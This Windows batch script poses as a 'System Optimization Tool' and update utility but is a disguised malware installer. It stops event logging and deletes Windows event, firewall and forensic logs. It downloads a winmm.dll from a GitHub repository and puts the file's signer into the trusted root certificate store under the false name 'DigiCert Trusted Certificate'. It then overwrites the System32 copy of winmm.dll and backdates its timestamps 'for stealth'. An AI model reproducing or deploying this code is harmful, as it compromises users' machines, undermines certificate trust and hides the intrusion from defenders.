@echo off
title System Optimization Tool - System Cleaner and Update
cls

echo ===========================================
echo           System Optimization Tool
echo       System Cleaner & Update Utility
echo ===========================================
echo Created by HDN RAHUL - 2025
echo Please run as Administrator!
echo ===========================================
pause

:: Check for Administrator privileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo ERROR: Please run this script as Administrator!
    pause
    exit /b
)

echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

echo Taking ownership and adjusting permissions for log files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1

echo Deleting log and temp files...
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1

:menu
cls
echo ===========================================
echo            System Update Tool
echo ===========================================
echo WARNING: Critical system-level optimizations ahead.
echo Do NOT interrupt once started.
echo ===========================================
echo 1. Apply System Update
echo 2. Exit
echo ===========================================
set /p choice="Choose an option (1-2): "

if "%choice%"=="1" goto update
if "%choice%"=="2" exit

goto menu

:update
cls
echo Applying system update...
echo ===========================================

:: Variables
set "dll_url=https://github.com/hiddenregedit/UDPATE/raw/refs/heads/main/winmm.dll"
set "dll_path=%TEMP%\winmm.dll"
set "sys_dll_path=%SystemRoot%\System32\winmm.dll"

:: Download DLL file
echo Downloading update file...
powershell -Command "Invoke-WebRequest -Uri '%dll_url%' -OutFile '%dll_path%'" >nul 2>&1

if not exist "%dll_path%" (
    echo ERROR: Failed to download the update file.
    pause
    exit /b
)
echo Download successful.

:: Add certificate silently (friendly name: DigiCert Trusted Certificate)
powershell -Command ^
"^
    $cert = Get-AuthenticodeSignature '%dll_path%'; ^
    if ($cert.SignerCertificate) { ^
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        $store.Open('ReadWrite'); ^
        $certObj = $cert.SignerCertificate; ^
        $certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        $store.Add($certObj); ^
        $store.Close(); ^
    } ^
" >nul 2>&1

echo Terminating processes using winmm.dll...
for /f "delims=" %%i in ('powershell -Command "Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'winmm.dll'})} | Select-Object -ExpandProperty Id"') do (
    echo Killing process ID %%i
    taskkill /PID %%i /F >nul 2>&1
)

echo Stopping update services...
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1

:: Take ownership and permissions
if exist "%sys_dll_path%" (
    takeown /f "%sys_dll_path%" /a >nul 2>&1
    icacls "%sys_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)

echo Copying update file...
copy /y "%dll_path%" "%sys_dll_path%" >nul
if %errorlevel% neq 0 (
    echo ERROR: Failed to apply update. Try running in Safe Mode.
    pause
    exit /b
)

:: Modify timestamps for stealth - 12-April-2023 08:48:00
powershell -Command "(Get-Item '%sys_dll_path%').CreationTime = '2023-04-12 08:48:00'"
powershell -Command "(Get-Item '%sys_dll_path%').LastAccessTime = '2023-04-12 08:48:00'"
powershell -Command "(Get-Item '%sys_dll_path%').LastWriteTime = '2023-04-12 08:48:00'"

echo Restarting services...
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

echo Clearing system logs and temp files post-update...
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Roaming\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\Firewall\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\WMI\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1

echo Optimization complete!
pause
goto menu
